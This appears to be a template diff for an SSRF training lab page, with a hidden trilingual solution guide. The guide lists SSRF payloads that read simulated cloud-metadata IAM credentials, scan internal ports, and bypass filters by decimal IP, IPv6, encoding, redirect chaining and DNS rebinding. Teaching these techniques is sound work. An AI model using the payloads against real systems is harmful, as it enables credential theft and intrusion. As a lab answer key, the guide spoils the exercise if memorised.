@@ -1,0 +1,135 @@
+{% extends "base.html" %}
+{% block title %}SSRF – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <form method="GET" action="/ssrf" class="space-y-3">
+      <div>
+        <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium" data-i18n="ssrf_label">URL destino</label>
+        <input type="text" name="url" value="{{ url | e }}" placeholder="http://..."
+               class="hl-input font-mono" />
+      </div>
+      <button type="submit" class="btn-primary" data-i18n="btn_fetch">Obtener</button>
+    </form>
+  </div>
+
+  {% if error %}
+  <div class="alert-error mb-4 text-xs font-mono">{{ error }}</div>
+  {% endif %}
+  {% if content %}
+  <div class="hl-card mb-4">
+    <div class="text-xs font-mono mb-2" style="color:var(--hl-primary)"><span data-i18n="ssrf_response">Respuesta de:</span> {{ url }}</div>
+    {% set first_char = content.lstrip()[0] if content.lstrip() else '' %}
+    {% if first_char in ['{', '['] %}
+    <pre class="text-green-400 text-xs whitespace-pre-wrap max-h-80 overflow-y-auto font-mono">{{ content }}</pre>
+    {% else %}
+    <pre class="text-gray-700 dark:text-gray-300 text-xs whitespace-pre-wrap max-h-80 overflow-y-auto">{{ content | truncate(2000, True, '...') }}</pre>
+    {% endif %}
+  </div>
+  {% endif %}
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>Easy — Acceso directo a servicios internos</h3>
+    <ol>
+      <li>Accede al endpoint de metadatos cloud simulado:
+        <pre>http://localhost:5000/internal/cloud-metadata</pre></li>
+      <li>Enumera credenciales IAM simuladas de AWS:
+        <pre>http://localhost:5000/internal/cloud-metadata/iam/security-credentials/hacklabs-ec2-role</pre></li>
+      <li>Obtén las credenciales AWS simuladas (flag incluida en el JSON):
+        <pre>curl "http://localhost:5000/ssrf?url=http://localhost:5000/internal/cloud-metadata/iam/security-credentials/hacklabs-ec2-role"</pre></li>
+      <li>Flag: <code>HL{···}</code> (dentro de la respuesta JSON)</li>
+      <li>Escanea puertos internos para detectar servicios:
+        <pre>http://localhost:22    # detecta SSH
+http://localhost:3306  # detecta MySQL</pre></li>
+    </ol>
+    <h3>Medium — Bypass de blacklist (localhost/127.0.0.1 bloqueados)</h3>
+    <ol>
+      <li>Usa la IP decimal equivalente a 127.0.0.1 (2130706433):
+        <pre>http://2130706433:5000/internal/cloud-metadata</pre></li>
+      <li>Accede a los metadatos igual que en Easy usando esa IP alternativa.</li>
+    </ol>
+    <h3>Hard — Bypass de whitelist estricta</h3>
+    <ol>
+      <li>IPv6 loopback (si no está bloqueado):
+        <pre>http://[::1]:5000/internal/cloud-metadata</pre></li>
+      <li>URL encoding doble para evadir la validación de cadena:
+        <pre>http://127%2e0%2e0%2e1:5000/internal/cloud-metadata</pre></li>
+      <li>Encadena con el lab de Open Redirect: usa un endpoint del servidor que redirija al destino interno.</li>
+      <li>DNS rebinding: usa un servicio externo que resuelva a 127.0.0.1 (por ejemplo <code>7f000001.nip.io</code>):
+        <pre>http://7f000001.nip.io:5000/internal/cloud-metadata</pre></li>
+    </ol>
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">curl</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">ffuf</span></div>
+  </div>
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>Easy — Direct access to internal services</h3>
+    <ol>
+      <li>Access the simulated cloud metadata endpoint:
+        <pre>http://localhost:5000/internal/cloud-metadata</pre></li>
+      <li>Enumerate simulated AWS IAM credentials:
+        <pre>http://localhost:5000/internal/cloud-metadata/iam/security-credentials/hacklabs-ec2-role</pre></li>
+      <li>Retrieve the simulated AWS credentials (flag included in the JSON):
+        <pre>curl "http://localhost:5000/ssrf?url=http://localhost:5000/internal/cloud-metadata/iam/security-credentials/hacklabs-ec2-role"</pre></li>
+      <li>Flag: <code>HL{···}</code> (inside the JSON response)</li>
+      <li>Scan internal ports to detect running services:
+        <pre>http://localhost:22    # detects SSH
+http://localhost:3306  # detects MySQL</pre></li>
+    </ol>
+    <h3>Medium — Blacklist bypass (localhost/127.0.0.1 blocked)</h3>
+    <ol>
+      <li>Use the decimal equivalent of 127.0.0.1 (2130706433):
+        <pre>http://2130706433:5000/internal/cloud-metadata</pre></li>
+      <li>Access metadata as in Easy using that alternative IP.</li>
+    </ol>
+    <h3>Hard — Strict whitelist bypass</h3>
+    <ol>
+      <li>IPv6 loopback (if not blocked):
+        <pre>http://[::1]:5000/internal/cloud-metadata</pre></li>
+      <li>Double URL encoding to evade string-based validation:
+        <pre>http://127%2e0%2e0%2e1:5000/internal/cloud-metadata</pre></li>
+      <li>Chain with the Open Redirect lab: use a server endpoint that redirects to the internal target.</li>
+      <li>DNS rebinding: use an external service that resolves to 127.0.0.1 (e.g. <code>7f000001.nip.io</code>):
+        <pre>http://7f000001.nip.io:5000/internal/cloud-metadata</pre></li>
+    </ol>
+    <h3>Tools</h3>
+    <div><span class="tools-badge">curl</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">ffuf</span></div>
+  </div>
+  <div class="lang-content" data-lang="pt" style="display:none">
+    <h3>Fácil — Acesso direto a serviços internos</h3>
+    <ol>
+      <li>Acesse o endpoint de metadados de nuvem simulado:
+        <pre>http://localhost:5000/internal/cloud-metadata</pre></li>
+      <li>Enumere credenciais IAM simuladas da AWS:
+        <pre>http://localhost:5000/internal/cloud-metadata/iam/security-credentials/hacklabs-ec2-role</pre></li>
+      <li>Obtenha as credenciais simuladas da AWS (flag incluída no JSON):
+        <pre>curl "http://localhost:5000/ssrf?url=http://localhost:5000/internal/cloud-metadata/iam/security-credentials/hacklabs-ec2-role"</pre></li>
+      <li>Flag: <code>HL{···}</code> (dentro da resposta JSON)</li>
+      <li>Escaneie portas internas para detectar serviços ativos:
+        <pre>http://localhost:22    # detecta SSH
+http://localhost:3306  # detecta MySQL</pre></li>
+    </ol>
+    <h3>Médio — Bypass de blacklist (localhost/127.0.0.1 bloqueados)</h3>
+    <ol>
+      <li>Use a representação decimal de 127.0.0.1 (2130706433):
+        <pre>http://2130706433:5000/internal/cloud-metadata</pre></li>
+      <li>Acesse os metadados como no Fácil usando esse IP alternativo.</li>
+    </ol>
+    <h3>Difícil — Bypass de whitelist estrita</h3>
+    <ol>
+      <li>IPv6 loopback (se não estiver bloqueado):
+        <pre>http://[::1]:5000/internal/cloud-metadata</pre></li>
+      <li>Double URL encoding para burlar a validação baseada em string:
+        <pre>http://127%2e0%2e0%2e1:5000/internal/cloud-metadata</pre></li>
+      <li>Encadeie com o laboratório de Open Redirect: utilize um endpoint do servidor que redirecione para o alvo interno.</li>
+      <li>DNS rebinding: use um serviço externo que resolva para 127.0.0.1 (por exemplo <code>7f000001.nip.io</code>):
+        <pre>http://7f000001.nip.io:5000/internal/cloud-metadata</pre></li>
+    </ol>
+    <h3>Ferramentas</h3>
+    <div><span class="tools-badge">curl</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">ffuf</span></div>
+  </div>
+</div>
+{% endblock %}
